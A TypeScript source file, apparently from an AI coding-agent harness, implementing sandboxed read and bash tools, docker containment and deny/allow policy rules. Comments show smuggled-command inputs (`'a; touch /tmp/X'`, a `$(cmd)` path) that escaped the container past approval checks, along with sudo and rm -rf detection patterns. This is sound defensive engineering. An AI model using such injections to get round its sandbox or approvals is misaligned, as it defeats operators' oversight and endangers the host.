  /** Cap on bytes returned to the model from read/bash */
  maxOutputBytes: number;
  /**
   * Line caps declared as `max_lines` on the bash and read declarations in
   * tools.toml (CX3, opt-in; resolveMaxLines). Applied before the byte cap.
   * Absent -- the default -- means exactly the behaviour before they existed.
   */
  maxLines?: { bash?: number; read?: number };
  /**
   * Where output too large for the window is kept instead of being thrown away.
   *
   * Truncation used to be the whole answer: the model got the first 32k and a
   * note saying "narrow it instead". That note is honest and it is also the
   * wrong advice for the measured failure -- roughly 41% of benchmark trials
   * end at the timeout cap, and the long tail is a model re-running a long
   * command. Telling it to run a *different* long command does not help; the
   * bytes it needed already existed and were discarded.
   *
   * So the full text is written beside the surface and the note names the
   * path, which `read` and `grep` can reach at every sandbox level because it
   * is inside the root. Absent, or returning null, means today's behaviour
   * exactly: truncate and say so. A path is never named unless the write
   * succeeded, because a citation to a file that is not there is worse than
   * the truncation it replaced.
   */
  spill?: SpillSink;
  /**
   * The session checklist `todo` reads and replaces.
   *
   * Supplied by the loop, which owns session state. Absent means the tool is
   * unavailable rather than silently forgetful — a checklist that accepted
   * writes and dropped them would be worse than no checklist.
   */
  todos?: TodoStore;
  /**
   * Runs a sub-turn under another role, for the `task` tool. Supplied by the
   * loop, because a tool cannot call the model by itself.
   */
  delegate?: Delegate;
  /** Whether tools may reach the network. From `[sandbox] network`. */
  network?: boolean;
  /**
   * `[sandbox] allow_package_index` (sweep_knobs.ts resolvePackageIndex):
   * hosts a bash command may name under `network = false` to download
   * packages. Absent or empty refuses every URL, as before.
   */
  packageIndex?: readonly string[];
  /**
   * The edit tool's declared variant (sweep_knobs.ts resolveEditVariant).
   * Absent or `default` is edit as it always was.
   */
  editVariant?: EditVariant;
  /**
   * Whether the agent may write inside `.gnomon/` this session. Absent =
   * `strict` = the surface is human-only (the default, and the pillar).
   * `custom` permits a surface write with per-edit approval; `all` is standing
   * consent. Set by the human with `/allow`, never by the agent.
   */
  allow?: SurfaceConsent;
  /**
   * Connected MCP servers, if any. `mcp__…` tool calls route here. Supplied by
   * the loop, which owns the server processes' lifetime.
   */
  mcp?: McpRegistry;
  /**
   * Commands that already hit the bash timeout this turn.
   *
   * Both the tool description and the timeout message tell the model to detach
   * a long command and poll it. It does not: the measured long tail is a model
   * re-running the same blocking command until the wall, at full timeout cost
   * each time. This harness's own pillar is capability over instruction, and
   * two rounds of instruction is the evidence that prose was the wrong lever.
   *
   * Supplied by the loop, which owns turn-scoped state.
   */
  timedOutCommands?: Set<string>;
  /**
   * Cancellation for the running turn.
   *
   * Esc and Ctrl-C were only ever checked BETWEEN tool calls, so a command that
   * had already started could not be interrupted at all: the operator's only
   * exits were the tool timeout or killing the terminal. On a 120s default that
   * is two minutes of an unstoppable command they have already asked to stop --
   * and `detached: true` puts it in its own process group, so the terminal's
   * own Ctrl-C does not reach it either.
   */
  signal?: AbortSignal;
  /**
   * The run's scratch notes. Supplied by the loop, which owns session state.
   * Absent means the tool is unavailable rather than silently forgetful.
   */
  notes?: NoteStore;
  /**
   * What the files this turn modified looked like BEFORE it touched them.
   *
   * Both `write` and `edit` already read the old content to build their diff,
   * so keeping it costs nothing — and it is what makes a test verifiable. T8
   * measured this model writing a test that actually pins behaviour 1 time in
   * 9, and three of the nine asserted the BUG as if it were the contract: tests
   * that pass today and would block the correct fix tomorrow.
   *
   * The check that catches all of those is mechanical -- run the new test
   * against the code as it was before the turn, and if it passes it pins
   * nothing -- and it needs exactly this.
   *
   * Supplied by the loop, which owns turn scope. First write wins, so the entry
   * is the state at the START of the turn rather than the previous step.
   */
  preImages?: Map<string, string>;
  /**
   * Where a degradation inside a tool is recorded. Optional: a tool that runs
   * without one still behaves identically, it just cannot write to the trail.
   */
  audit?: DegradationSink;
}

/** One thing the run learned about itself, written by the model as it worked. */
export interface RunNote {
  /** Turn the note was written on, for ordering and for the audit record. */
  turn: number;
  text: string;
}

/**
 * The run's own notes: what has been tried, what did not work, what to avoid.
 *
 * DESIGN.md forbids an agent rewriting its own SKILLS mid-session, because that
 * would change the surface hash underneath the run that changed it. That
 * argument is correct and this does not violate it: notes live outside the
 * surface, exactly as `.gnomon-sessions/` and `.gnomon-audit/` already do, for
 * exactly the same reason. They are read back as observation, never as
 * instruction, and they cannot grant a capability the surface withheld.
 *
 * Without this the harness is amnesiac inside a single run -- which is why its
 * measured long tail was repeating an action that had already failed.
 */
export interface NoteStore {
  list(): RunNote[];
  add(text: string): void;
}

/** One item on the session checklist. */
export interface Todo {
  content: string;
  status: TodoStatus;
}

export type TodoStatus = "pending" | "in_progress" | "completed";

/** Where the checklist lives. The loop owns it; the tool only edits it. */
export interface TodoStore {
  list(): Todo[];
  replace(todos: Todo[]): void;
}

/** What `task` needs from the loop to run a sub-turn. */
export interface Delegate {
  /** Roles a sub-turn may be given. */
  roles(): string[];
  /** Run `instruction` as `role`, with no history, and return its answer. */
  run(role: string, instruction: string): Promise<DelegateResult>;
  /** How deep the current turn already is. 0 is the top-level turn. */
  depth: number;
}

export interface DelegateResult {
  content: string;
  code: number;
  toolSteps: number;
  model: string;
}

/**
 * Offload the full text and describe where it went, or say nothing.
 *
 * Returns "" when there is no sink or the write failed, so every caller below
 * degrades to the truncation message it had before.
 */
function spilled(text: string, ctx: ToolContext, label: string): string {
  const rel = ctx.spill?.(text, label);
  if (!rel) return "";
  // `grep`, not `read`. A file this size does not fit the window either, so
  // "read that file" is advice that cannot work: reading it truncates at the
  // same limit and offloads it a second time. Measured end to end before this
  // wording was written -- the first version said "read or grep", and the read
  // it recommended returned another truncated prefix.
  return (
    ` The full ${text.length} bytes are saved at ${rel} — \`grep\` that path for ` +
    `what you need rather than running the command again.`
  );
}

function clamp(text: string, ctx: ToolContext, label: string): string {
  const limit = ctx.maxOutputBytes;
  if (text.length <= limit) return text;
  const kept = spilled(text, ctx, label);
  return (
    `${text.slice(0, limit)}\n… [truncated at ${limit} bytes — this is the start of the output, not all of it.${kept}` +
    `${kept ? "" : " Repeating the call returns the same prefix: narrow it instead, with grep, a subpath, or a filtered command."}]`
  );
}

/**
 * Keep both ends of an output that is too long, and say how much went missing.
 *
 * `clamp` keeps the head, which is right when the model can narrow the call and
 * try again. A killed command cannot be narrowed and re-run cheaply — and the
 * part that says *why* it was still running is usually the last thing it
 * printed. So a timeout keeps the tail as well, and names the dropped byte
 * count rather than eliding silently.
 */
function clampEnds(text: string, ctx: ToolContext, label: string): string {
  const limit = ctx.maxOutputBytes;
  if (text.length <= limit) return text;
  const head = Math.floor(limit * 0.6);
  const tail = limit - head;
  const dropped = text.length - limit;
  const kept = spilled(text, ctx, label);
  return (
    `${text.slice(0, head)}\n… [${dropped} bytes dropped from the middle — this is the start and the end of the output, not all of it.${kept}]\n${text.slice(-tail)}`
  );
}

/** What `read` refuses before it would ask or touch the filesystem. */
export function readPrecheck(
  args: Record<string, unknown>,
  ctx: ToolContext
): { refusal: Precheck } | { abs: string } {
  // A missing, empty or non-string path resolved to "" and then to the
  // FILESYSTEM ROOT — `read / — 1 entries` — rather than being refused. The
  // model asked for nothing and got a listing of somewhere it never named.
  if (typeof args.path !== "string" || args.path.trim() === "") {
    return {
      refusal: {
        rule: "malformed",
        code: TOOL_DENIED,
        content: `Refused: read needs a \`path\`. Nothing was given, and an absent path is not a path.`,
        summary: `read — no path given`,
      },
    };
  }
  const path = args.path;
  const abs = resolveInRoot(ctx.root, path, ctx.sandbox, ctx.extraRoots);
  if (!abs) {
    return {
      refusal: {
        rule: "sandbox",
        code: TOOL_OUT_OF_SANDBOX,
        content: `Refused: "${path}" is outside the repository root and sandbox=${ctx.sandbox}.`,
        summary: `read ${path} — refused (outside sandbox)`,
      },
    };
  }
  return { abs };
}

async function readTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pre = readPrecheck(args, ctx);
  if ("refusal" in pre) return outcomeOf(pre.refusal);
  const path = args.path as string;
  const abs = pre.abs;
  // Ask BEFORE touching the filesystem.
  //
  // The existence probe used to run first, so under approval = "always" a
  // DECLINED read still answered "does this path exist?" -- the operator said
  // no and the model learned something anyway. Small, but it is the whole point
  // of the gate: a refusal that leaks the answer is not a refusal.
  const denied = await gateReadOnly("read", `read ${path}`, ctx);
  if (denied) return denied;

  if (!existsSync(abs)) {
    // The tool worked and the answer is "it isn't there". That is a result,
    // not an apparatus failure — exploring a tree turns up missing paths
    // constantly, and marking each one as broken apparatus makes the bucket
    // meaningless.
    return {
      code: TOOL_OK_EMPTY,
      content: `No such file or directory: ${path}`,
      summary: `read ${path} — not found`,
    };
  }

  try {
    if (statSync(abs).isDirectory()) {
      const entries = readdirSync(abs, { withFileTypes: true })
        .filter((e) => e.name !== "node_modules" && e.name !== ".git")
        .map((e) => (e.isDirectory() ? `${e.name}/` : e.name))
        .sort();
      return {
        code: TOOL_OK,
        content: entries.join("\n") || "(empty directory)",
        summary: `read ${path.replace(/\/+$/, "")}/ — ${entries.length} entries`,
      };
    }
    const raw = readFileSync(abs, "utf-8");
    // Split on CRLF too. A trailing \r on every line of a Windows checkout is
    // invisible in the transcript and poison in anything copied from it.
    // `edit` matches LF text against CRLF files, so what is shown here is what
    // can be edited; the summary says which ending the file really has.
    const crlf = raw.includes("\r\n");
    // Opt-in (`max_lines` on the read declaration, CX3). Without it, nothing
    // below this line changed.
    const window = ctx.maxLines?.read;
    if (window) return readWindowed(path, raw, crlf, args, window, ctx);
    const numbered = raw
      .split(/\r?\n/)
      .map((l, n) => `${String(n + 1).padStart(5)}\t${l}`)
      .join("\n");
    return {
      code: TOOL_OK,
      content: clamp(
        numbered,
        // Re-offloading an offloaded file writes a second, larger copy of
        // bytes already on disk and hands back another prefix. Nothing is
        // gained and the directory grows on every attempt.
        path.split(sep).join("/").startsWith(`${OVERFLOW_DIR}/`)
          ? { ...ctx, spill: undefined }
          : ctx,
        `read-${path}`
      ),
      summary: `read ${path} — ${raw.split("\n").length} lines${crlf ? " · CRLF" : ""}`,
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not read ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `read ${path} — failed`,
    };
  }
}

/**
 * A windowed file view (CX3, opt-in): at most `window` lines from `offset`,
 * numbered as in the whole file, with a footer saying where the rest is.
 *
 * Today's read returns the whole file up to the 32 KB byte cap. In the
 * 2026-11 trails about a third of reads were of files over 200 lines (up to
 * 10,001), and that observation is paid for again by every later request in
 * the turn. A window costs a second call when the model needs more; whether
 * that trade wins on gnomon's own lanes is what the A/B is for.
 *
 * `offset` and `limit` are read only here. A surface with no window ignores
 * them, as it always has, even from a model that sends them unasked.
 */
function readWindowed(
  path: string,
  raw: string,
  crlf: boolean,
  args: Record<string, unknown>,
  window: number,
  ctx: ToolContext
): ToolOutcome {
  const lines = raw.split(/\r?\n/);
  const total = lines.length;
  const whole = (v: unknown) => (typeof v === "number" && Number.isInteger(v) && v >= 1 ? v : undefined);
  const start = whole(args.offset) ?? 1;
  const count = Math.min(whole(args.limit) ?? window, window);
  const ending = crlf ? " · CRLF" : "";
  if (start > total) {
    return {
      code: TOOL_OK_EMPTY,
      content: `${path} has ${total} lines, so offset ${start} is past the end. Nothing is there to show.`,
      summary: `read ${path} — ${total} lines · offset ${start} past the end${ending}`,
    };
  }
  const end = Math.min(total, start + count - 1);
  const shown = lines
    .slice(start - 1, end)
    .map((l, i) => `${String(start + i).padStart(5)}\t${l}`)
    .join("\n");
  const partial = start > 1 || end < total;
  const footer = !partial
    ? ""
    : end < total
      ? `\n… [lines ${start}–${end} of ${total} shown; ${total - end} more below` +
        (start > 1 ? ` and ${start - 1} above` : "") +
        `. Read on with offset = ${end + 1}, or grep the file for what you need.]`
      : `\n… [lines ${start}–${end} of ${total} shown: the end of the file, with ${start - 1} lines above.]`;
  return {
    code: TOOL_OK,
    // The file is on disk already, so a window too wide for the byte cap is
    // not offloaded again: the footer says how to read the rest of it.
    content: clamp(shown, { ...ctx, spill: undefined }, `read-${path}`) + footer,
    summary: `read ${path} — ${total} lines${partial ? ` · shown ${start}–${end}` : ""}${ending}`,
  };
}

/**
 * Keep the first and last lines of an output longer than `max` (CX3, opt-in:
 * `max_lines` on the bash declaration), and say how many were omitted and how
 * to narrow the command. The full output is offloaded first, as the byte cap
 * does, and the returned context has no sink, so the byte cap that follows
 * cannot write the same output a second time. No cap, or an output within it,
 * returns both arguments unchanged.
 *
 * Both ends, success or failure: an exit status and a summary line are at the
 * top and the bottom of most output, and the error a failing build printed is
 * usually its last line.
 */
function capLines(
  text: string,
  max: number | undefined,
  ctx: ToolContext,
  label: string
): { text: string; ctx: ToolContext } {
  if (!max) return { text, ctx };
  const lines = text.split("\n");
  if (lines.length <= max) return { text, ctx };
  const head = Math.ceil(max / 2);
  const tail = max - head;
  const omitted = lines.length - max;
  const kept = spilled(text, ctx, label);
  const note =
    `… [output truncated: ${omitted} lines omitted — narrow it with grep, head, tail ` +
    `or sed -n 'A,Bp'.${kept}]`;
  return {
    text: [...lines.slice(0, head), note, ...(tail > 0 ? lines.slice(-tail) : [])].join("\n"),
    ctx: { ...ctx, spill: undefined },
  };
}

/**
 * Kill a spawned shell and everything it started.
 *
 * With shell:true the direct child is `sh -c`, which is not what does the
 * work. Signalling the negated pid targets the whole process group, so a
 * timed-out command cannot leave a live orphan behind.
 */
/**
 * The POSIX shell every `bash` tool call runs under, on every platform.
 *
 * WHY NOT cmd.exe. `spawn(cmd, { shell: true })` runs `/bin/sh -c` on Unix and
 * `cmd.exe /d /s /c` on Windows. That would make the same surface, at the same
 * hash, mean two different languages -- `ls`, `grep`, heredocs, `&&` chains and
 * every `bash_allow` pattern behave differently or not at all. gnomon's whole
 * claim is that a checkout with a given hash behaves the same way on another
 * machine, and a shell that changes with the operating system is machine-scoped
 * behaviour of the worst kind: invisible in the hash.
 *
 * So Windows uses a POSIX shell too. Git for Windows ships one (`bash.exe`,
 * MSYS2-based, works in the Windows filesystem), and it is already installed
 * anywhere `git` is.
 *
 * NOT WSL, deliberately. `bash.exe` on PATH is often WSL's launcher, which runs
 * in a different filesystem with a different root -- so `ctx.root` would not
 * mean the same path to the shell as it does to the sandbox check, and the
 * containment guarantees would be reasoning about the wrong tree. Git Bash is
 * searched by absolute path for that reason, and PATH is consulted last.
 *
 * Returns null when no POSIX shell exists. The caller REFUSES on null rather
 * than falling back to cmd.exe: a harness that silently changes language is the
 * silent-degradation class this repository has spent a week hunting.
 */
let cachedShell: string | null | undefined;

export function posixShell(): string | null {
  if (cachedShell !== undefined) return cachedShell;
  if (process.platform !== "win32") return (cachedShell = "/bin/sh");

  // A machine fact, like the path to a native binary -- not behaviour, and so
  // not surface. Same reasoning as GNOMON_BIN_OVERRIDE and the credential
  // store, both of which live outside the hash on purpose.
  const override = process.env.GNOMON_SHELL;
  if (override && existsSync(override)) return (cachedShell = override);

  return (cachedShell = findGitBash(process.env, existsSync));
}

/**
 * Git for Windows' bash.exe, without assuming where Git was installed.
 *
 * It looked in three fixed directories and nowhere else, although the comment
 * above has always said "PATH is consulted last" -- so a Scoop install, a
 * portable Git, or any custom install directory was refused with "no POSIX
 * shell" on a machine where `git` worked. The fixed locations still come first.
 * Then Git's own install root is derived from wherever `git.exe` sits on PATH
 * (`<root>\cmd`, `<root>\bin`, `<root>\mingw64\bin`). A bare bash.exe on PATH
 * is taken last, and never from System32 or WindowsApps: those are WSL's
 * launchers, which run in another filesystem (see NOT WSL above).
 *
 * Win32 path arithmetic on purpose, so it is testable on any host.
 */
export function findGitBash(
  env: Record<string, string | undefined>,
  exists: (p: string) => boolean
): string | null {
  const w = win32Path;
  const pf = env["ProgramFiles"] || "C:\\Program Files";
  const pf86 = env["ProgramFiles(x86)"] || "C:\\Program Files (x86)";
  const local = env.LOCALAPPDATA || "";
  const home = env.USERPROFILE || "";
  const fixed = [
    w.join(pf, "Git", "bin", "bash.exe"),
    w.join(pf86, "Git", "bin", "bash.exe"),
    local ? w.join(local, "Programs", "Git", "bin", "bash.exe") : "",
    home ? w.join(home, "scoop", "apps", "git", "current", "bin", "bash.exe") : "",
  ];
  for (const c of fixed) if (c && exists(c)) return c;

  const dirs = (env.PATH ?? env.Path ?? "").split(";").map((d) => d.trim().replace(/^"|"$/g, "")).filter(Boolean);
  for (const d of dirs) {
    if (!exists(w.join(d, "git.exe"))) continue;
    const leaf = w.basename(d).toLowerCase();
    const parent = w.dirname(d);
    const roots =
      leaf === "bin" && w.basename(parent).toLowerCase() === "mingw64"
        ? [w.dirname(parent)]
        : leaf === "cmd" || leaf === "bin"
          ? [parent]
          : [];
    for (const r of roots) {
      const c = w.join(r, "bin", "bash.exe");
      if (exists(c)) return c;
    }
  }
  for (const d of dirs) {
    const c = w.join(d, "bash.exe");
    if (/\\(system32|windowsapps)(\\|$)/i.test(d)) continue;
    if (exists(c)) return c;
  }
  return null;
}

/** Reset the memoised shell. Tests only. */
export function _resetShellCache(): void {
  cachedShell = undefined;
}

/** `sudo` where the shell would run it: first word of a command, or after xargs/env. */
export const SUDO_AT_COMMAND_POSITION = /(?:^|[;&|(`\n]|\$\()\s*(?:(?:xargs|env|command|exec|nohup)\s+(?:-\S+\s+)*)?sudo\b/;

/**
 * A note for a pipeline whose status is its last stage's.
 *
 * /bin/sh here is dash: no pipefail, no PIPESTATUS. `pnpm run verify 2>&1 |
 * tail -40` reports tail's exit 0 whatever verify did, and the agent then
 * re-ran the check again and again trying to learn its real status. The output
 * is already clamped at both ends, so the tail bought nothing.
 */
export function pipelineStatusNote(command: string): string {
  const m = /\|\s*(tail|head|grep|egrep|sort|uniq|wc|cut|awk|sed|cat|less|more)\b[^|]*$/.exec(command.trim());
  if (!m || /\|\|[^|]*$/.test(command.trim())) return "";
  return (
    `\n\n(note: this exit status is \`${m[1]}\`'s, the last command in the pipeline -- ` +
    `not the status of what fed it. This shell has no pipefail. For the real status, ` +
    `drop the pipe: output is already clamped at both ends, so the error is kept. Or: ` +
    `\`cmd >log 2>&1; echo "exit=$?"; tail -40 log\`.)`
  );
}

/** What to tell an operator on a Windows box with no POSIX shell. */
export const NO_POSIX_SHELL =
  "Refused: no POSIX shell found, so `bash` cannot run.\n\n" +
  "gnomon runs shell commands through a POSIX shell on every platform, so that " +
  "the same surface behaves the same way on every machine. Falling back to " +
  "cmd.exe would change what your commands mean without changing the surface " +
  "hash.\n\n" +
  "Install Git for Windows (it ships the shell gnomon uses):\n" +
  "    winget install --id Git.Git\n\n" +
  "Or point gnomon at one you already have:\n" +
  "    PowerShell:  $env:GNOMON_SHELL = \"C:\\path\\to\\bash.exe\"\n" +
  "    cmd:         set GNOMON_SHELL=C:\\path\\to\\bash.exe";

/**
 * Kill the command and its children. Resolves once the kill has been carried
 * out -- on Windows, when taskkill has exited, since taskkill /T /F is what
 * ends the tree; elsewhere at once, because the group SIGKILL is synchronous.
 */
function killTree(
  proc: { pid?: number; kill: (sig: NodeJS.Signals) => boolean },
  containerName?: string
): Promise<void> {
  // A container is not in the process group. Killing `docker run` returns the
  // shell to us and leaves the container running, so a timed-out command would
  // keep working -- writing into the repository -- after the turn had given up
  // on it. The caller removes it, and waits for that (removeContainer).
  if (containerName) {
    try {
      spawn("docker", ["rm", "-f", containerName], {
        stdio: "ignore",
        detached: true,
      }).unref();
    } catch {
      // docker gone, or never started one
    }
  }
  if (typeof proc.pid === "number" && process.platform === "win32") {
    // No process groups to signal. /T walks the tree, /F is SIGKILL's analogue.
    try {
      const tk = spawn("taskkill", ["/pid", String(proc.pid), "/T", "/F"], {
        stdio: "ignore",
      });
      // Not unref'd: whoever awaits this kill must keep the process alive until
      // it settles. An unref'd taskkill plus an unref'd cap timer let Node exit
      // mid-wait with code 13 (an unsettled top-level await) when nothing else
      // was pending -- the Windows property-suite gate caught it.
      return new Promise<void>((done) => {
        tk.once("exit", () => done());
        tk.once("error", () => done());
      });
    } catch {
      // fall through to the direct kill below
    }
  }
  if (typeof proc.pid === "number") {
    try {
      process.kill(-proc.pid, "SIGKILL");
      return Promise.resolve();
    } catch {
      // group already gone, or no permission — fall through
    }
  }
  try {
    proc.kill("SIGKILL");
  } catch {
    // already exited
  }
  return Promise.resolve();
}

/** How long a killed command's container may take to be removed before the turn stops waiting. */
const CONTAINER_REMOVE_MS = 20_000;

/**
 * Remove a killed command's container and wait until docker says it is gone,
 * bounded by CONTAINER_REMOVE_MS. Returns whether it is confirmed gone.
 *
 * WHY (fourth review, finding 4). killTree used to start `docker rm -f` and
 * return. The turn went on to its host-side git -- worktreeMoved, the
 * turn-end measurement, a config reload -- while the container still ran and
 * could rewrite .git/config between gnomon's driver listing and the git that
 * trusted it. Now the tool returns only once the container is gone. One that
 * cannot be confirmed gone stays registered with git_safe, and no gnomon git
 * runs on this machine until docker says it is.
 */
async function removeContainer(name: string): Promise<boolean> {
  const until = Date.now() + CONTAINER_REMOVE_MS;
  const run = (args: string[], ms: number) =>
    new Promise<{ code: number | null; err: string }>((done) => {
      let err = "";
      let child;
      try {
        child = spawn("docker", args, { stdio: ["ignore", "ignore", "pipe"], windowsHide: true });
      } catch {
        done({ code: null, err: "" });
        return;
      }
      const timer = setTimeout(() => {
        try {
          child.kill("SIGKILL");
        } catch {
          /* gone */
        }
        done({ code: null, err });
      }, Math.max(1, ms));
      child.stderr?.on("data", (d: Buffer) => (err += d.toString()));
      child.once("error", () => {
        clearTimeout(timer);
        done({ code: null, err });
      });
      child.once("exit", (code) => {
        clearTimeout(timer);
        done({ code, err });
      });
    });
  while (Date.now() < until) {
    await run(["rm", "-f", name], until - Date.now());
    const seen = await run(["inspect", "--format", "{{.State.Status}}", name], Math.min(5000, Math.max(1, until - Date.now())));
    if (seen.code !== null && seen.code !== 0 && /no such (object|container)/i.test(seen.err)) {
      containerGone(name);
      return true;
    }
    await new Promise((r) => setTimeout(r, 200));
  }
  return false;
}

/** What the model is told when its killed command's container could not be confirmed removed. */
const CONTAINER_NOT_GONE =
  "\n\n(The sandbox container could not be confirmed removed. gnomon runs no git on this machine " +
  "until docker reports it gone, so changes made meanwhile are not measured.)";

/**
 * On Windows, a timed-out or cancelled command is reported only once its tree
 * has actually gone: taskkill has finished and the shell has exited, bounded
 * by KILL_SETTLE_MS. Fired-and-forgotten, the report raced the kill and the
 * command's working directory stayed locked for ~0.4-0.5 s afterwards, so a
 * caller's cleanup failed with EPERM (WINP, 2026-11-02, 3/3). Elsewhere the
 * group SIGKILL has already done its work, and nothing waits: the timing #61
 * measured is unchanged.
 */
const KILL_SETTLE_MS = 2000;
function settleKill(killed: Promise<void>, exited: Promise<void>): Promise<void> {
  if (process.platform !== "win32") return Promise.resolve();
  let timer: NodeJS.Timeout | undefined;
  const cap = new Promise<void>((done) => {
    timer = setTimeout(done, KILL_SETTLE_MS);
  });
  return Promise.race([Promise.all([killed, exited]).then(() => undefined), cap]).finally(() => clearTimeout(timer));
}

/**
 * Rewrite a shell command so it runs inside a container instead of on the host.
 *
 * The repository is bind-mounted at the same absolute path it has outside, so
 * absolute paths the model has already seen keep working and the cwd is
 * unchanged from its point of view. Everything else on the host is simply not
 * there.
 *
 * --user maps the caller. Without it every file the agent creates comes back
 * owned by root and the operator cannot edit their own repository without
 * sudo; that was the first thing testing this found.
 *
 * --network none unless the surface declares network = true, which finally
 * makes that declaration mean something for `bash`. Until now it governed only
 * the webfetch tool, and the startup note says so.
 *
 * The container is named after the run so a cancelled turn can remove it: the
 * process group kill that stops a host command does not stop a container.
 */
/**
 * One POSIX single-quoted shell word. The only correct way to put a value this
 * process did not choose into a shell line.
 *
 * `'\''` -- four characters: close, escaped quote, reopen. Written as a JS
 * template literal it is three, because `\'` in a template literal is just
 * `'`; that is the bug this function exists to make unrepeatable, and it is
 * why the replacement below uses a plain string rather than a template.
 */
export function shq(value: string): string {
  return "'" + value.split("'").join("'\\''") + "'";
}

export function sandboxCommand(
  command: string,
  ctx: { root: string; exec?: { mode: "off" | "docker"; image: string; network: boolean }; agentSession?: string },
  name: string
): string {
  const ex = ctx.exec;
  if (!ex || ex.mode === "off") return command;
  // Single-quoted for `sh -c`, so only the quote character needs escaping --
  // and it was escaped WRONG. The POSIX idiom is `'\''`: close the quote,
  // emit a backslash-escaped quote, reopen. That is four characters. Written as
  // a JS template literal, `` `'\''` `` is only THREE -- `\'` in a template
  // literal is just `'` -- so every apostrophe became `'''` and the escaping
  // silently did nothing.
  //
  // Measured 2026-09-07, with the docker sandbox on:
  //   echo 'hello world'  ->  sh -c 'echo '''hello world''''
  //                       ->  argv: ["echo hello", "world"]
  // so the container ran `echo hello` and `world` became $0 and vanished. With
  // an ODD number of quotes (`don't`) the whole command is a shell syntax
  // error instead. It IS a container escape: `grep 'a; touch /tmp/X' f.txt`
  // becomes `sh -c 'grep '''a; touch /tmp/X''' f.txt'`, whose `;` the host
  // shell reads unquoted, and the tail runs outside the container -- after
  // bash_deny, bash_allow and the approval prompt have all read the ORIGINAL
  // text, where it was a harmless grep pattern.
  const inner = shq(command);
  // The image is a word of the host's shell line and a docker argument: a
  // value starting with `-` was a docker FLAG (`--privileged`), and one with
  // a space or `;` was more of the line (fifth review, finding 5). Checked
  // against the reference grammar, refused otherwise, and quoted regardless.
  if (!isValidImageRef(ex.image)) throw new RootWriteError(`[sandbox] image ${JSON.stringify(ex.image)} is not a container image reference`);
  // gnomon's own state and git's control files, read-only inside (root_fs.ts
  // containedReadonlyPaths). Throws when one is a symlink.
  const readonly = containedReadonlyPaths(ctx.root);
  let realRoot = ctx.root;
  try {
    realRoot = realpathSync(ctx.root);
  } catch {
    /* not there: its spelling */
  }
  const uid = typeof process.getuid === "function" ? process.getuid() : 0;
  const gid = typeof process.getgid === "function" ? process.getgid() : 0;
  return [
    "docker run --rm",
    `--name ${name}`,
    ex.network ? "" : "--network none",
    `--user ${uid}:${gid}`,
    // shq, NOT JSON.stringify. JSON.stringify produces a DOUBLE-quoted word,
    // and `$( )` inside double quotes is still command substitution -- so a
    // project directory named `/tmp/proj-$(cmd)` executed `cmd` on the host the
    // moment the sandbox was switched on. Verified 2026-09-08 by running the
    // constructed line through /bin/sh with docker stubbed: the marker file
    // appeared. The command was fixed on 2026-09-07 and this half was left,
    // which is the more common shape of a quoting bug -- one call site noticed,
    // its neighbours not.
    `-v ${shq(ctx.root)}:${shq(ctx.root)}`,
    ...readonly.map((p) => `-v ${shq(p)}:${shq(p)}:ro`),
    `-w ${shq(ctx.root)}`,
    // Which project the container can write, for any gnomon process to ask
    // (git_safe liveContainer): the dashboard, `gnomon check`, `gnomon
    // guard` and a second session do not share this process's registry.
    `--label ${shq(`${CONTAINER_ROOT_LABEL}=${realRoot}`)}`,
    // The agent-session marker, into the container too: a `gnomon skill
    // accept` installed in the image is the agent's as much as one on the
    // host. `-e NAME=value`, the value quoted for the host shell.
    `-e ${AGENT_SESSION_ENV}=${shq(ctx.agentSession || `pid-${process.pid}`)}`,
    shq(ex.image),
    `sh -c ${inner}`,
  ]
    .filter(Boolean)
    .join(" ");
}

/**
 * Which rule refused a call before it ran. A published enumeration: `gnomon
 * guard` reports it (CONTRACTS.md §8), so a caller can switch on why.
 *
 *   tools        the role was not given this tool
 *   malformed    the call's arguments cannot be read as that tool's
 *   bash_deny    a bash_deny pattern matched
 *   bash_allow   a segment is not on the role's bash_allow
 *   sudo         sudo on the host
 *   sandbox      a path outside the root and every granted extra_roots
 *   surface      a write or edit inside `.gnomon/` (and any shell write there)
 *   record       a write into gnomon's own records: the audit trail, trial
 *                reports, session snapshots
 *   git_hooks    a write into `.git/hooks/` or `.git/config`, or a `git config`
 *                that sets a key git runs as a program (core.hooksPath, …)
 *   write_allow  a path outside the role's write_allow
 *   network      `[sandbox] network = false`
 *   url          a scheme other than http(s), or a private / loopback address
 *   repo_code    the call runs repository-defined code (`npm test`, `make`,
 *                `pip install -e .`) and `[approval] repo_code = true` asks
 *                a person first (decision ask, never deny)
 */
export const POLICY_RULES = [
  "tools",
  "malformed",
  "bash_deny",
  "bash_allow",
  "sudo",
  "sandbox",
  "surface",
  "record",
  "git_hooks",
  "write_allow",
  "network",
  "url",
  "repo_code",
] as const;
export type PolicyRule = (typeof POLICY_RULES)[number];

/**
 * What a tool's precheck says before it would ask anyone or do anything.
 * With `rule`: a refusal, and the rule that made it. Without: the call would
 * fail on its own (an empty command, a URL that does not parse) -- the tool's
 * answer, not a policy's.
 */
export type Precheck = ToolOutcome & { rule?: PolicyRule; pattern?: string };

/**
 * Does a role's bash_allow / bash_deny let this command through?
 *
 * The decision bashTool makes before it runs anything, as a function of the
 * command and the two lists alone. Extracted so `gnomon check` can put a
 * command another harness ran -- read out of its transcript -- to exactly the
 * test this loop would have put it to. A second matcher would be a second
 * policy, and the two would disagree on the first command nobody tried.
 *
 * Returns null when the command is allowed, or the refusal bashTool returns,
 * plus which list refused it and the pattern, for a caller that reports rather
 * than refuses.
 *
 * AN INTENT FILTER, NOT CONTAINMENT. Both lists read the command the way the
 * shell will (see shell.ts): `rm -fr`, `rm --recursive --force` and `rm -R`
 * are offered to a pattern written as `rm -rf` or `rm .* -r`, and a program
 * that `find -exec`, `xargs`, `env`, `sudo` or `sh -c` runs is checked like
 * one the line runs itself. That stops a model reaching a denied operation
 * through another common spelling. It does not stop code -- `python -c
 * 'shutil.rmtree(…)'` has no `rm` in it -- and no list of commands can.
 * `[sandbox] exec = "docker"` is the containment.
 */
export function bashPolicy(
  command: string,
  allow: string[] | undefined,
  deny: string[] | undefined
): (ToolOutcome & { rule: "bash_deny" | "bash_allow"; pattern?: string }) | null {
  // Read once, for both lists, and only when there is a list to read for.
  const read = (deny && deny.length > 0) || (allow && allow.length > 0)
    ? readShellCommand(command)
    : null;

  // Deny first, and independently of the allow-list.
  //
  // An allow-list cannot say "everything except three catastrophes". The role
  // that does the work needs unrestricted bash — it runs builds, installers
